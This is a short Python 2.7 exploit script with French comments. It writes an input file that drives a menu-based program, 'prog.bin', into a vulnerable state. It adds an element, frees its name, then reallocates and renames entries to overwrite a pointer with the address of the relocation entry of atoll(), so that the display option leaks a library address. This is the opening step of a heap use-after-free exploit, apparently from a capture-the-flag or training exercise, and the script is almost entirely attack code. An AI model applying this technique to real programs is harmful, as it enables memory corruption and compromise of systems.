#!/usr/bin/env python2.7
# coding: utf-8

# crée un fichier réponse pour mettre prog.bin dans un état vulnérable

import os
import struct  # noqa: F401
from pwn import *  # noqa: F401,F403
import sys  # noqa: F401
import subprocess  # noqa: F401


class VP:
    def __init__(self):
        self.fp = open("response", "wb")

    def sendline(self, s):
        self.fp.write(s + "\n")

    def recvuntil(self, s):
        pass


def aff(titre="", s=None):
    pass


def ajout(nom="NOM", id="ID"):
    vp.sendline("1")                # nouvel élément
    vp.sendline(nom)                # nom
    vp.sendline(id)                 # id
    s = vp.recvuntil("sortie")
    aff("AJOUT", s)
    return s


def affichage():
    vp.sendline("2")
    s = vp.recvuntil("sortie")
    aff("AFFICHAGE", s)
    return s


def change_nom(num=0, nom="NOUVEAU"):
    vp.sendline("4")
    vp.sendline(str(num))
    vp.sendline(nom)
    s = vp.recvuntil("sortie")
    aff("CHANGE_NOM", s)
    return s


def change_id(num=0, id="NOUVEAU"):
    vp.sendline("5")
    vp.sendline(str(num))
    vp.sendline(id)
    s = vp.recvuntil("sortie")
    aff("CHANGE_ID", s)
    return s


def detruire(num=0, quoi="id"):
    vp.sendline("3")
    vp.sendline(str(num))
    vp.sendline({"id": "1", "nom": "2"}.get(quoi))
    s = vp.recvuntil("sortie")
    aff("DETRUIRE_" + quoi.upper(), s)
    return s


def sortie():
    vp.sendline("6")


def stop():
    vp.sendline("7")
    s = vp.recvuntil("sortie")
    aff("STOP", s)
    return s


vp = VP()

ajout("A"*15, "aa")  # élement 0
detruire(0, "nom")

ajout("C"*30, "cc")  # élement 1

change_nom(0, "\x48\x20\x60")  # adresse de relocation de atoll()

a = affichage()         # affiche l'adresse de atoll()
